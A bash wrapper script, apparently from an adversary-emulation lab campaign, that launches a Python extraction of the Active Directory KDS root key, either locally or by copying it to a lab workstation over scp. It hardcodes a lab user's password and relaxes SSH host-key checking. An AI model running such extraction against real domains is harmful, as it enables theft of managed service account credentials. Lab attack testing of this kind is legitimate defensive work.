#!/usr/bin/env bash
# T097 — KDS Root Key extraction (WT097) via Python on provisioning or ws01 python
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../lib/campaign-a-common.sh"
CASE_ID="CADRE-T097-KDS-$(date -u +%Y%m%d)"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
echo "=== T097 KDS Root Key | ${CASE_ID} | T0=${T0} ==="
PY="${SCRIPT_DIR}/../windows/wt097-kds-rootkey.py"
# Prefer local python on provisioning (ldap3); fallback copy+run on ws01
if python3 -c 'import ldap3' 2>/dev/null; then
  python3 "${PY}"
else
  scp -i "${WS01_SSH_KEY:-${HOME}/.ssh/cadre-ws01-key}" -o StrictHostKeyChecking=accept-new \
    "${PY}" analyst_t1@192.168.77.62:C:/Tools/cadre-attack/wt097-kds-rootkey.py
  ws01_exec_as analyst_t1 'T13r_An@lyst!' \
    'python C:\Tools\cadre-attack\wt097-kds-rootkey.py' 'child.cadre.local'
fi
cadre_export "${CASE_ID}" T097 "${T0}" 192.168.77.62
echo "T097 complete"
